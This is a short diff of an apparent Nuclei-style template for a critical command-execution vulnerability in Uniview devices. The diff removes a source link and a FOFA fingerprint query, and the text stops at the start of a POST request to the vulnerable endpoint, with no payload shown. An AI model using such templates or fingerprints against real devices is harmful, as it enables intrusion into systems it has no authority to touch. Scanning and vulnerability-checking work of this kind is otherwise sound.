@@ -3,12 +3,8 @@ info:
   name: 宇视科技 setNatConfig存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ibz80s10n5paspq0'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ibz80s10n5paspq0
-    fofa: body="/Script/Public/Language.js.php"
 http:
 - raw:
   - 'POST /Interface/DevManage/VM.php HTTP/1.1
